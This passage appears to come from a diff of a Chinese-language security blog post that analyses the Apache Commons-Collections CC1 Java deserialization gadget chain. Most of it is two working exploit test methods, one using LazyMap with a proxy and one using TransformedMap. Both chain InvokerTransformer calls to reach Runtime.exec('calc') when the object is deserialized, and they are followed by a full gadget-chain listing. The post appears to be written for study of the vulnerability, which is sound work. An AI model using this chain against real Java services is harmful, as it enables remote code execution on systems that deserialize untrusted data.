+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test6() throws Throwable {
+    Transformer[] trueTransformer = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, new Class[0]}),
+            new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc&#34;}),
+            new ConstantTransformer(1)
+    };
+
+    // 使用ChainedTransformer，防止反序列化之前被执行，此时传入的不是真正的利用链。
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+            new ConstantTransformer(1)
+    });
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+    // 获取lazyMap
+    Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+    // 将LazyMap封装在AnnotationInvocationHandler中，想办法触发AnnotationInvocationHandler#invoke方法，因为invoke方法内调用了lazyMap#get
+    Class&lt;?&gt; clazz = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
+    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+    constructor.setAccessible(true);
+    InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
+
+    // 如何调用AnnotationInvocationHandler#invoke方法呢？可以使用代理，将前面获取的AnnotationInvocationHandler对象作为代理的handler
+    // 那么只要调用代理对象的任何方法，都将触发AnnotationInvocationHandler对象的invoke方法
+    // 获取一个代理对象，将前面获取的AnnotationInvocationHandler实例作为代理对象的InvocationHandler
+    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+
+    // 最后将proxyMap封装在AnnotationInvocationHandler对象中，作为反序列化入口
+    InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+
+    // 最后再把真正的Transformer传入chainedTransformer
+    Class&lt;? extends ChainedTransformer&gt; chainedTransformerClass = chainedTransformer.getClass();
+    Field iTransformers = chainedTransformerClass.getDeclaredField(&#34;iTransformers&#34;);
+    iTransformers.setAccessible(true);
+    iTransformers.set(chainedTransformer,trueTransformer);
+    // 序列化和反序化测试
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+    objectOutputStream.writeObject(res);
+    new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())).readObject();
+}</pre></td></tr></table>
+</div>
+</div>
+<p>这里给出调用栈，如下图所示：</p>
+
+<p><img src="./../media/2020-03-31-3.png" alt="CC1调用栈" /></p>
+
+<p><strong><em>Notice:</em></strong>  Debug时候，发现Map(Proxy).entrySet()始终无法跳到这个断点，最后是在LazyMap#get中直接打上断点才调试到整个利用链的。</p>
+
+<p>下面给出完整的利用链：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Gadget chain:
+    ObjectInputStream.readObject()
+        AnnotationInvocationHandler.readObject()
+            Map(Proxy).entrySet()
+                AnnotationInvocationHandler.invoke()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+
+Requires:
+    commons-collections</pre></td></tr></table>
+</div>
+</div>
+<p>这边再贴一个P神的原创POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">@Test
+public void test7() throws Exception{
+    // 用P神的链打一下
+    Transformer[] trueTransformer = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, new Class[0]}),
+            new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc&#34;}),
+    };
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformer);
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+    hashMap.put(&#34;value&#34;,&#34;test&#34;);
+    Map evalMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+    Class&lt;?&gt; clazz = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
+    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+    constructor.setAccessible(true);
+    InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, evalMap);
+    // 序列化和反序列化测试
+    SerialUtil.runPayload(handler);
+}</pre></td></tr></table>
+</div>
+</div>
+<p>调用栈如下：</p>
+
+<p><img src="./../media/2020-03-31-4.png" alt="P神CC1链" /></p>
 
     </div>
 
